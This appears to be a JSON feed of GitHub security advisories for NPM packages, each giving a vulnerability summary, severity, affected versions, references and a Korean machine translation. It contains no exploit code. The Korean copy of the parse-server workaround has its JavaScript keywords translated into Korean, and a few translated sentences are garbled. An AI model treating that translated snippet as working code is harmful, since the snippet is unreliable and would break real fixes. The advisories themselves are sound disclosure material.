    "descriptionKR": "### 영향\n\n내부 필드(Parse Server에서 내부적으로 사용하는 키, 접두어 '_') 및 보호 필드(사용자 정의)를 쿼리 제약 조건으로 사용할 수 있습니다. 내부 및 보호 필드는 쿼리 결과에서 Parse Server에 의해 제거되며 유효한 마스터 키를 사용하는 클라이언트에만 반환됩니다. 그러나 쿼리 제약 조건을 사용하면 Parse Server가 응답 개체를 반환할 때까지 열거하여 이러한 필드를 추측할 수 있습니다.\n\n### 패치\n\n패치는 내부 및 보호 필드를 쿼리 제약 조건으로 사용하기 위해 마스터 키가 필요합니다.\n\n### 해결 방법\n\nParse Cloud Trigger 'beforeFind'를 구현하고 다음과 같은 쿼리 제약 조건을 수동으로 제거합니다.\n\n```js\nParse.Cloud.beforeFind('TestObject', ({ 쿼리 }) => {\n  for (query의 const 키._where || []) {\n    // 보호된 필드에 대한 논리 반복\n    if (key.charAt(0) === '_') {\n      삭제 쿼리._where[key];\n    }\n  }\n});\n```\n\n### 참조\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-2m6g-crv8-p3c6"
  },
  {
    "description": "All versions of package morgan-json are vulnerable to Arbitrary Code Execution due to missing sanitization of input passed to the `Function` constructor.",
    "identifiers": "GHSA : GHSA-fwv4-6mxc-x5h3\nCVE : CVE-2022-25921",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:02:16Z",
    "publishedAt": "2022-08-29T20:06:55Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25921\nhttps://github.com/indexzero/morgan-json/blob/3a76010215a4256d41687d082cd66c4f00ea5717/index.js%23L46\nhttps://security.snyk.io/vuln/SNYK-JS-MORGANJSON-2976193\nhttps://github.com/advisories/GHSA-fwv4-6mxc-x5h3",
    "name": "morgan-json",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.1.0",
    "descriptionKR": "패키지 morgan-json의 모든 버전은 `Function` 생성자로 전달된 입력의 삭제 누락으로 인해 임의 코드 실행에 취약합니다."
  },
  {
    "description": "In oauth2-server (aka node-oauth2-server) through 3.1.1, the value of the `redirect_uri` parameter received during the authorization and token request is checked against an incorrect URI pattern (`[a-zA-Z][a-zA-Z0-9+.-]+:`) before making a redirection. This allows a malicious client to pass an XSS payload through the redirect_uri parameter while making an authorization request. NOTE: this vulnerability is similar to CVE-2020-7741.",
    "identifiers": "GHSA : GHSA-4rg6-fm25-gc34\nCVE : CVE-2020-26938",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:39Z",
    "publishedAt": "2022-08-30T00:00:26Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-26938\nhttps://github.com/oauthjs/node-oauth2-server/issues/637\nhttps://github.com/oauthjs/node-oauth2-server/blob/91d2cbe70a0eddc53d72def96864e2de0fd41703/lib/grant-types/authorization-code-grant-type.js#L143\nhttps://github.com/oauthjs/node-oauth2-server/blob/91d2cbe70a0eddc53d72def96864e2de0fd41703/lib/validator/is.js#L12\nhttps://tools.ietf.org/html/rfc3986#section-3\nhttps://tools.ietf.org/html/rfc6749#section-3.1.2\nhttps://github.com/advisories/GHSA-4rg6-fm25-gc34",
    "name": "oauth2-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 3.1.1",
    "descriptionKR": "oauth2-server(일명 node-oauth2-server)에서 3.1.1까지, 권한 부여 및 토큰 요청 중에 수신된 `redirect_uri` 매개변수의 값이 잘못된 URI 패턴(`[a-zA-Z][a -zA-Z0-9+.-]+:`) 리디렉션하기 전에. 이렇게 하면 악의적인 클라이언트가 인증 요청을 하는 동안 redirect_uri 매개 변수를 통해 XSS 페이로드를 전달할 수 있습니다. 참고: 이 취약점은 CVE-2020-7741과 유사합니다."
  },
  {
    "description": "All versions of package @pendo324/get-process-by-name are vulnerable to Arbitrary Code Execution due to improper sanitization of getProcessByName function.",
    "identifiers": "GHSA : GHSA-qhxv-296x-hjv7\nCVE : CVE-2022-25644",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:02:39Z",
    "publishedAt": "2022-08-29T20:06:55Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25644\nhttps://github.com/pendo324/get-process-by-name-js/blob/34e8a279a94fa23acb13e302e9516ab1ea8d8731/index.js%23L27-L28\nhttps://security.snyk.io/vuln/SNYK-JS-PENDO324GETPROCESSBYNAME-2419094\nhttps://github.com/advisories/GHSA-qhxv-296x-hjv7",
    "name": "@pendo324/get-process-by-name",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0",
    "descriptionKR": "@pendo324/get-process-by-name 패키지의 모든 버전은 getProcessByName 함수의 부적절한 삭제로 인해 임의 코드 실행에 취약합니다."
  },
  {
    "description": "All versions of package x-data-spreadsheet are vulnerable to Cross-site Scripting (XSS) due to missing sanitization of values inserted into the cells.",
    "identifiers": "GHSA : GHSA-x5cw-843f-r366\nCVE : CVE-2022-25646",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:02:27Z",
    "publishedAt": "2022-08-31T00:00:24Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25646\nhttps://github.com/myliang/x-spreadsheet/issues/580\nhttps://security.snyk.io/vuln/SNYK-JS-XDATASPREADSHEET-2430381\nhttps://youtu.be/Ij-8VVKNh7U\nhttps://github.com/advisories/GHSA-x5cw-843f-r366",
    "name": "x-data-spreadsheet",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.1.9",
    "descriptionKR": "패키지 x-data-spreadsheet의 모든 버전은 셀에 삽입된 값의 삭제 누락으로 인해 XSS(교차 사이트 스크립팅)에 취약합니다."
  },
  {
    "description": "_This is a historical security advisory, pertaining to a vulnerability that was reported, patched, and published in 2021. It is listed here for completeness and for CVE tracking purposes._\n\n### Impact\nDue to an unnecessarily strict conditional in the code handling the first step of the SSO process, the pre-existing logic that added (and later checked) a nonce was inadvertently rendered opt-in instead of opt-out.\n\nThis re-exposed a vulnerability in that a specially crafted MITM attack could theoretically take over another user account during the single sign-on process.\n\n### Patches\nThe issue has been fully patched as of v1.17.2.\n\nThe patch commit can be found at https://github.com/NodeBB/NodeBB/commit/a2400f6baff44cb2996487bcd0cc6e2acc74b3d4\n\n### Workarounds\nSite maintainers can cherry-pick https://github.com/NodeBB/NodeBB/commit/a2400f6baff44cb2996487bcd0cc6e2acc74b3d4 into their codebase to patch the exploit.\n\n### References\n* https://blogs.opera.com/security/2022/03/bug-bounty-adventures-a-nodebb-0-day/\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Discuss it on [our community forum](community.nodebb.org/)\n* Email us at [support@nodebb.org](mailto:support@nodebb.org)\n",
    "identifiers": "GHSA : GHSA-xmgg-fx9p-prq6\nCVE : CVE-2022-36076",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:50Z",
    "publishedAt": "2022-09-16T18:38:45Z",
    "references": "https://github.com/NodeBB/NodeBB/security/advisories/GHSA-xmgg-fx9p-prq6\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36076\nhttps://github.com/NodeBB/NodeBB/commit/a2400f6baff44cb2996487bcd0cc6e2acc74b3d4\nhttps://blogs.opera.com/security/2022/03/bug-bounty-adventures-a-nodebb-0-day/\nhttps://github.com/advisories/GHSA-xmgg-fx9p-prq6",
    "name": "nodebb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.17.1",
    "identifier": "1.17.2",
    "descriptionKR": "_이는 2021년에 보고, 패치 및 게시된 취약점과 관련된 과거 보안 권고입니다. 완전성과 CVE 추적 목적을 위해 여기에 나열되었습니다._\n\n### 영향\nSSO 프로세스의 첫 번째 단계를 처리하는 코드의 불필요하게 엄격한 조건부로 인해 nonce를 추가하고 나중에 확인하는 기존 로직이 실수로 옵트아웃 대신 옵트인으로 렌더링되었습니다.\n\n이로 인해 특수하게 조작된 MITM 공격이 이론적으로 싱글 사인온 프로세스 중에 다른 사용자 계정을 탈취할 수 있다는 취약점이 다시 드러났습니다.\n\n### 패치\n이 문제는 v1.17.2에서 완전히 패치되었습니다.\n\n패치 커밋은 https://github.com/NodeBB/NodeBB/commit/a2400f6baff44cb2996487bcd0cc6e2acc74b3d4에서 찾을 수 있습니다.\n\n### 해결 방법\n사이트 관리자는 https://github.com/NodeBB/NodeBB/commit/a2400f6baff44cb2996487bcd0cc6e2acc74b3d4를 자신의 코드베이스로 선택하여 익스플로잇을 패치할 수 있습니다.\n\n### 참조\n* https://blogs.opera.com/security/2022/03/bug-bounty-adventures-a-nodebb-0-day/\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [커뮤니티 포럼](community.nodebb.org/)에서 토론하세요.\n* [support@nodebb.org](mailto:support@nodebb.org)로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\n\nIf a vunerable version of cruddl is used to generate a schema that uses `@flexSearchFulltext`, users of that schema may be able to inject arbitrary AQL queries that will be forwarded to and executed by ArangoDB.\n\nSchemas that do not use `@flexSearchFulltext` are not affected.\n\nThe attacker needs to have `READ` permission to at least one root entity type that has `@flexSearchFulltext` enabled.\n\n### Patches\n\nThe issue has been fixed in version 3.0.2 and in version 2.7.0 of cruddl.\n\n### Workarounds\n\nUsers can temporarily remove `@flexSearchFulltext` from their schemas before they can update cruddl.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [cruddl](https://github.com/AEB-labs/cruddl)\n* Email us at [security@aeb.com](mailto:security@aeb.com)\n",
    "identifiers": "GHSA : GHSA-qm4w-4995-vg7f\nCVE : CVE-2022-36084",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:02:45Z",
    "publishedAt": "2022-09-16T17:43:10Z",
    "references": "https://github.com/AEB-labs/cruddl/security/advisories/GHSA-qm4w-4995-vg7f\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36084\nhttps://github.com/AEB-labs/cruddl/pull/253\nhttps://github.com/AEB-labs/cruddl/commit/13b9233733ed6fc822718a07bc90a80cd3492698\nhttps://github.com/advisories/GHSA-qm4w-4995-vg7f",
    "name": "cruddl",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.1.0, < 2.7.0",
    "identifier": "2.7.0",
    "descriptionKR": "### 영향\n\ncrudl의 vunerable 버전이 `@flexSearchFulltext`를 사용하는 스키마를 생성하는 데 사용되는 경우 해당 스키마의 사용자는 ArangoDB로 전달되고 실행될 임의의 AQL 쿼리를 주입할 수 있습니다.\n\n`@flexSearchFulltext`를 사용하지 않는 스키마는 영향을 받지 않습니다.\n\n공격자는 `@flexSearchFulltext`가 활성화된 하나 이상의 루트 엔터티 유형에 대한 `READ` 권한이 있어야 합니다.\n\n### 패치\n\n이 문제는 Cruddl 버전 3.0.2 및 버전 2.7.0에서 수정되었습니다.\n\n### 해결 방법\n\n사용자는 crudl을 업데이트하기 전에 스키마에서 일시적으로 `@flexSearchFulltext`를 제거할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [cruddl](https://github.com/AEB-labs/cruddl)에서 이슈 열기\n* [security@aeb.com](mailto:security@aeb.com)으로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\n\nIf a vunerable version of cruddl is used to generate a schema that uses `@flexSearchFulltext`, users of that schema may be able to inject arbitrary AQL queries that will be forwarded to and executed by ArangoDB.\n\nSchemas that do not use `@flexSearchFulltext` are not affected.\n\nThe attacker needs to have `READ` permission to at least one root entity type that has `@flexSearchFulltext` enabled.\n\n### Patches\n\nThe issue has been fixed in version 3.0.2 and in version 2.7.0 of cruddl.\n\n### Workarounds\n\nUsers can temporarily remove `@flexSearchFulltext` from their schemas before they can update cruddl.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [cruddl](https://github.com/AEB-labs/cruddl)\n* Email us at [security@aeb.com](mailto:security@aeb.com)\n",
    "identifiers": "GHSA : GHSA-qm4w-4995-vg7f\nCVE : CVE-2022-36084",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:02:45Z",
    "publishedAt": "2022-09-16T17:43:10Z",
    "references": "https://github.com/AEB-labs/cruddl/security/advisories/GHSA-qm4w-4995-vg7f\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36084\nhttps://github.com/AEB-labs/cruddl/pull/253\nhttps://github.com/AEB-labs/cruddl/commit/13b9233733ed6fc822718a07bc90a80cd3492698\nhttps://github.com/advisories/GHSA-qm4w-4995-vg7f",
    "name": "cruddl",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.0.2",
    "identifier": "3.0.2",
    "descriptionKR": "### 영향\n\ncrudl의 vunerable 버전이 `@flexSearchFulltext`를 사용하는 스키마를 생성하는 데 사용되는 경우 해당 스키마의 사용자는 ArangoDB로 전달되고 실행될 임의의 AQL 쿼리를 주입할 수 있습니다.\n\n`@flexSearchFulltext`를 사용하지 않는 스키마는 영향을 받지 않습니다.\n\n공격자는 `@flexSearchFulltext`가 활성화된 하나 이상의 루트 엔터티 유형에 대한 `READ` 권한이 있어야 합니다.\n\n### 패치\n\n이 문제는 Cruddl 버전 3.0.2 및 버전 2.7.0에서 수정되었습니다.\n\n### 해결 방법\n\n사용자는 crudl을 업데이트하기 전에 스키마에서 일시적으로 `@flexSearchFulltext`를 제거할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [cruddl](https://github.com/AEB-labs/cruddl)에서 이슈 열기\n* [security@aeb.com](mailto:security@aeb.com)으로 이메일을 보내주세요."
  },
  {
    "description": "The Blink1Control2 application <= 2.2.7 uses weak password encryption and an insecure method of storage. Version 2.2.9 fixes the issue.",
    "identifiers": "GHSA : GHSA-jqhq-pfg3-fg5p\nCVE : CVE-2022-35513",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:03:35Z",
    "publishedAt": "2022-09-08T00:00:30Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-35513\nhttps://github.com/p1ckzi/CVE-2022-35513\nhttps://github.com/todbot/Blink1Control2/releases\nhttps://github.com/todbot/Blink1Control2/issues/175\nhttps://github.com/todbot/Blink1Control2/commit/74827462aba3a26d7bf157522f69eec999d7ba85\nhttps://github.com/todbot/Blink1Control2/commit/cd9229ef9131bc663f714150c9f8d5cbf818d620\nhttps://github.com/todbot/Blink1Control2/commit/efe174823f67bbdcee8863e02df67a130f132075\nhttps://github.com/todbot/Blink1Control2/commit/f595d782d2356878188fed423a7dcb84ee8fee9d\nhttp://packetstormsecurity.com/files/168428/Blink1Control2-2.2.7-Weak-Password-Encryption.html\nhttps://github.com/advisories/GHSA-jqhq-pfg3-fg5p",
    "name": "Blink1Control2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.2.9",
    "identifier": "2.2.9",
    "descriptionKR": "Blink1Control2 애플리케이션 <= 2.2.7은 취약한 비밀번호 암호화와 안전하지 않은 저장 방법을 사용합니다. 버전 2.2.9는 문제를 해결합니다."
  },
  {
    "description": "secure-store in Expo through 9.1.0 on iOS provides the insecure kSecAttrAccessibleAlwaysThisDeviceOnly policy when WHEN_UNLOCKED_THIS_DEVICE_ONLY is used.",
    "identifiers": "GHSA : GHSA-rwx9-wqj8-vr77\nCVE : CVE-2020-24653",
    "severity": "MODERATE",
    "updatedAt": "2023-02-02T05:07:35Z",
    "publishedAt": "2022-05-24T17:26:43Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-24653\nhttps://github.com/expo/expo/pull/9264\nhttps://github.com/expo/expo/commit/1d82bf07fae2c96273e9189997e521359cffc1a9#diff-5b2820f378da980bd8a8185e2e1b2f9ce085d834534483f29c67932f282cc5c9\nhttps://github.com/expo/expo/blob/main/packages/expo-secure-store/CHANGELOG.md\nhttps://github.com/advisories/GHSA-rwx9-wqj8-vr77",
    "name": "expo",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 9.1.0",
    "identifier": "9.1.0",
    "descriptionKR": "iOS에서 9.1.0까지 Expo의 secure-store는 WHEN_UNLOCKED_THIS_DEVICE_ONLY가 사용될 때 안전하지 않은 kSecAttrAccessibleAlwaysThisDeviceOnly 정책을 제공합니다."
  },
  {
    "description": "Electron version 1.7.0 - 1.7.5 is vulnerable to a URL Spoofing problem when opening PDFs in PDFium resulting loading arbitrary PDFs that a hacker can control.",
    "identifiers": "GHSA : GHSA-6h98-cf9g-vmg2\nCVE : CVE-2017-1000424",
    "severity": "MODERATE",
    "updatedAt": "2023-02-02T05:03:38Z",
    "publishedAt": "2022-05-13T01:41:15Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2017-1000424\nhttps://github.com/electron/electron/pull/10008\nhttps://github.com/electron/electron/pull/10008/files\nhttps://github.com/electron/electron/releases/tag/v1.7.6\nhttps://github.com/advisories/GHSA-6h98-cf9g-vmg2",
    "name": "Electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.7.0, < 1.7.6",
    "identifier": "1.7.6",
    "descriptionKR": "Electron 버전 1.7.0 - 1.7.5는 PDFium에서 PDF를 열 때 해커가 제어할 수 있는 임의의 PDF를 로드할 때 URL 스푸핑 문제에 취약합니다."
  },
  {
    "description": "Server-Side Request Forgery (SSRF) in GitHub repository ionicabizau/parse-url prior to 8.1.0.",
    "identifiers": "GHSA : GHSA-j9fq-vwqv-2fm2\nCVE : CVE-2022-2900",
    "severity": "CRITICAL",
    "updatedAt": "2023-06-21T18:10:05Z",
    "publishedAt": "2022-09-15T00:00:24Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2900\nhttps://github.com/ionicabizau/parse-url/commit/b88c81df8f4c5168af454eaa4f92afa9349e4e13\nhttps://huntr.dev/bounties/1b4c972a-abc8-41eb-a2e1-696db746b5fd\nhttps://github.com/advisories/GHSA-j9fq-vwqv-2fm2",
    "name": "parse-url",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 8.1.0",
    "identifier": "8.1.0",
    "descriptionKR": "8.1.0 이전의 GitHub 저장소 ionicabizau/parse-url에 있는 SSRF(Server-Side Request Forgery)."
  },
  {
    "description": "### Impact\n\nIRC allows you to specify multiple modes in a single mode command. Due to a bug in the underlying matrix-org/node-irc library, affected versions of matrix-appservice-irc perform parsing of such modes incorrectly, potentially resulting in the wrong user being given permissions.\n\nMode commands can only be executed by privileged users, so this can only be abused if an operator is tricked into running the command on behalf of an attacker.\n\n### Patches\n\nThe vulnerability has been patched in matrix-appservice-irc 0.35.0.\n\n### Workarounds\n\nRefrain from entering mode commands suggested by untrusted users. Avoid using multiple modes in a single command.\n\n### References\n\n- https://matrix.org/blog/2022/09/13/security-release-of-matrix-appservice-irc-0-35-0-high-severity\n\n### Credits\n\nDiscovered and reported by [Val Lorentz](https://valentin-lorentz.fr/).\n\n### For more information\n\nIf you have any questions or comments about this advisory email us at [security@matrix.org](mailto:security@matrix.org).",
    "identifiers": "GHSA : GHSA-cq7q-5c67-w39w\nCVE : CVE-2022-39202",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:00:51Z",
    "publishedAt": "2022-09-15T03:26:25Z",
    "references": "https://github.com/matrix-org/matrix-appservice-irc/security/advisories/GHSA-cq7q-5c67-w39w\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39202\nhttps://github.com/matrix-org/matrix-appservice-irc/commit/5f87dbed87b4b6dc49b7965ff152ee8535719e67\nhttps://matrix.org/blog/2022/09/13/security-release-of-matrix-appservice-irc-0-35-0-high-severity/\nhttps://github.com/advisories/GHSA-cq7q-5c67-w39w",
    "name": "matrix-appservice-irc",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.35.0",
    "identifier": "0.35.0",
    "descriptionKR": "### 영향\n\nIRC를 사용하면 단일 모드 명령에서 여러 모드를 지정할 수 있습니다. 기본 matrix-org/node-irc 라이브러리의 버그로 인해 영향을 받는 matrix-appservice-irc 버전은 이러한 모드의 구문 분석을 잘못 수행하여 잠재적으로 잘못된 사용자에게 권한이 부여될 수 있습니다.\n\n모드 명령은 권한이 있는 사용자만 실행할 수 있으므로 운영자가 속아 공격자를 대신하여 명령을 실행하는 경우에만 남용될 수 있습니다.\n\n### 패치\n\n이 취약점은 matrix-appservice-irc 0.35.0에서 패치되었습니다.\n\n### 해결 방법\n\n신뢰할 수 없는 사용자가 제안한 모드 명령을 입력하지 마십시오. 단일 명령에서 여러 모드를 사용하지 마십시오.\n\n### 참조\n\n- https://matrix.org/blog/2022/09/13/security-release-of-matrix-appservice-irc-0-35-0-high-severity\n\n### 크레딧\n\n[Val Lorentz](https://valentin-lorentz.fr/)에서 발견하고 보고했습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있으면 [security@matrix.org](mailto:security@matrix.org)로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n\nAttackers can specify a specific string of characters, which would confuse the bridge into combining an attacker-owned channel and an existing channel, allowing them to grant themselves permissions in the channel.\n\n### Patched\n\nThe vulnerability has been patched in matrix-appservice-irc 0.35.0.\n\n### Workarounds\n\nDisable dynamic channel joining via `dynamicChannels.enabled` to prevent users from joining new channels, which prevents any new channels being bridged outside of what is already bridged, and what is specified in the config.\n\n### References\n\n- https://matrix.org/blog/2022/09/13/security-release-of-matrix-appservice-irc-0-35-0-high-severity\n\n### Credits\n\nDiscovered and reported by [Val Lorentz](https://valentin-lorentz.fr/).\n\n### For more information\n\nIf you have any questions or comments about this advisory email us at [security@matrix.org](mailto:security@matrix.org).",
    "identifiers": "GHSA : GHSA-xvqg-mv25-rwvw\nCVE : CVE-2022-39203",
    "severity": "HIGH",
    "updatedAt": "2023-01-29T05:00:51Z",
    "publishedAt": "2022-09-15T03:26:10Z",
    "references": "https://github.com/matrix-org/matrix-appservice-irc/security/advisories/GHSA-xvqg-mv25-rwvw\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39203\nhttps://matrix.org/blog/2022/09/13/security-release-of-matrix-appservice-irc-0-35-0-high-severity/\nhttps://github.com/advisories/GHSA-xvqg-mv25-rwvw",
    "name": "matrix-appservice-irc",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.35.0",
    "identifier": "0.35.0",
    "descriptionKR": "### 영향\n\n공격자는 특정 문자열을 지정할 수 있으며, 이는 브리지가 공격자 소유 채널과 기존 채널을 결합하도록 혼동하여 채널에서 자신에게 권한을 부여할 수 있도록 합니다.\n\n### 패치됨\n\n이 취약점은 matrix-appservice-irc 0.35.0에서 패치되었습니다.\n\n### 해결 방법\n\n'dynamicChannels.enabled'를 통한 동적 채널 가입을 비활성화하여 사용자가 새 채널에 가입하지 못하도록 합니다. 이렇게 하면 이미 브리지된 채널과 구성에 지정된 채널 외에 새 채널이 브리지되는 것을 방지할 수 있습니다.\n\n### 참조\n\n- https://matrix.org/blog/2022/09/13/security-release-of-matrix-appservice-irc-0-35-0-high-severity\n\n### 크레딧\n\n[Val Lorentz](https://valentin-lorentz.fr/)에서 발견하고 보고했습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있으면 [security@matrix.org](mailto:security@matrix.org)로 이메일을 보내주십시오."
  },
  {
    "description": "A cross-site scripting (XSS) vulnerability in Markdown-Nice v1.8.22 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the Community Posting field.",
    "identifiers": "GHSA : GHSA-462r-wxvm-jvxh\nCVE : CVE-2022-38639",
    "severity": "MODERATE",
    "updatedAt": "2023-02-02T05:08:14Z",
    "publishedAt": "2022-09-10T00:00:24Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-38639\nhttps://github.com/mdnice/markdown-nice/issues/327\nhttps://github.com/advisories/GHSA-462r-wxvm-jvxh",
    "name": "markdown-nice",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.8.22",
    "descriptionKR": "Markdown-Nice v1.8.22의 XSS(교차 사이트 스크립팅) 취약성으로 인해 공격자는 커뮤니티 게시 필드에 삽입된 제작된 페이로드를 통해 임의의 웹 스크립트 또는 HTML을 실행할 수 있습니다."
  },
  {
    "description": "All versions of `fs-path` are vulnerable to command injection is unsanitized user input is passed in.\n\n\n## Recommendation\n\nNo fix is currently available for this vulnerability. It is our recommendation to not install or use this module until a fix is available.",
    "identifiers": "GHSA : GHSA-gc94-6w89-hpqr",
    "severity": "HIGH",
    "updatedAt": "2023-01-09T05:03:21Z",
    "publishedAt": "2019-06-12T16:37:07Z",
    "references": "https://hackerone.com/reports/324491\nhttps://www.npmjs.com/advisories/661\nhttps://github.com/pillys/fs-path/pull/5\nhttps://github.com/advisories/GHSA-gc94-6w89-hpqr",
    "name": "fs-path",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.0.25",
    "identifier": "0.0.25",
    "descriptionKR": "`fs-path`의 모든 버전은 정제되지 않은 사용자 입력이 전달되는 명령 삽입에 취약합니다.\n\n\n## 추천\n\n현재 이 취약점에 대한 수정 사항이 없습니다. 수정이 가능할 때까지 이 모듈을 설치하거나 사용하지 않는 것이 좋습니다."
  },
  {
    "description": "Cross-site scripting (XSS) vulnerability in jQuery before 1.6.3, when using location.hash to select elements, allows remote attackers to inject arbitrary web script or HTML via a crafted tag.",
    "identifiers": "GHSA : GHSA-579v-mp3v-rrw5\nCVE : CVE-2011-4969",
    "severity": "MODERATE",
    "updatedAt": "2023-05-31T17:52:34Z",
    "publishedAt": "2022-05-14T01:09:51Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2011-4969\nhttps://github.com/jquery/jquery/commit/db9e023e62c1ff5d8f21ed9868ab6878da2005e9\nhttps://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E\nhttps://security.netapp.com/advisory/ntap-20190416-0007/\nhttp://blog.jquery.com/2011/09/01/jquery-1-6-3-released/\nhttp://blog.mindedsecurity.com/2011/07/jquery-is-sink.html\nhttp://bugs.jquery.com/ticket/9521\nhttp://www.openwall.com/lists/oss-security/2013/01/31/3\nhttp://www.ubuntu.com/usn/USN-1722-1\nhttps://security.snyk.io/vuln/SNYK-DOTNET-JQUERY-450224\nhttps://github.com/advisories/GHSA-579v-mp3v-rrw5",
    "name": "jquery",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.6.3",
    "identifier": "1.6.3",
    "descriptionKR": "1.6.3 이전 jQuery의 XSS(교차 사이트 스크립팅) 취약성으로 인해 location.hash를 사용하여 요소를 선택할 때 원격 공격자가 조작된 태그를 통해 임의의 웹 스크립트 또는 HTML을 주입할 수 있습니다."
  },
  {
    "description": "### Impact\nServer JWT signing secret was included in static assets and served to clients.\n\nThis ALLOWS Flood's builtin authentication to be bypassed. Given Flood is granted access to rTorrent's SCGI interface (which is unprotected and ALLOWS arbitrary code execution) and usually wide-ranging privileges to files, along with Flood's lack of security controls against authenticated users, the severity of this vulnerability is **CRITICAL**. \n\n### Background\nCommit 8d11640b imported `config.js` to client (frontend) components to get `disableUsersAndAuth` configuration variable. Subsequently contents of `config.js` are compiled into static assets and served to users. Unfortunately `config.js` also includes `secret`.\n\nIntruders can use `secret` to sign authentication tokens themselves to bypass builtin access control of Flood.\n\n### Patches\nCommit 042cb4ce removed imports of `config.js` from client (frontend) components. Additionally an eslint rule was added to prevent config.js from being imported to client (frontend) components.\n\nCommit 103f53c8 provided a general mitigation to this kind of problem by searching static assets to ensure `secret` is not included before starting server (backend). \n\n### Workarounds\nUsers shall upgrade if they use Flood's builtin authentication system.\n\nWhile maintainers will do their best to support it, Flood cannot guarantee its in-house access control system can stand against determined attackers in high-stake environments. \n\n> Use `HTTP Basic Auth` or other battle-hardened authentication methods instead of Flood's in-house one. You can use `disableUsersAndAuth` to avoid duplicate authentication.\n\nUsers are advised to check out the [wiki](https://github.com/jesec/flood/wiki) for more information on security precautions.\n\n### References\n[Wiki - Security precautions](https://github.com/jesec/flood/wiki/Security-precautions)\n\n[Introduction to JSON Web Tokens](https://jwt.io/introduction/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [issue tracker](https://github.com/jesec/flood/issues)\n* Email us at [jc@linux.com](mailto:jc@linux.com)",
    "identifiers": "GHSA : GHSA-r587-7jh2-4qr3",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-06T05:01:57Z",
    "publishedAt": "2020-08-26T19:32:50Z",
    "references": "https://github.com/jesec/flood/security/advisories/GHSA-r587-7jh2-4qr3\nhttps://github.com/jesec/flood/commit/103f53c8d2963584e41bcf46ccc6fe0fabf179ca\nhttps://github.com/jesec/flood/commit/d137107ac908526d43966607149fbaf00cfcedf0\nhttps://github.com/advisories/GHSA-r587-7jh2-4qr3",
    "name": "flood",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 3.0.0",
    "identifier": "3.0.0",
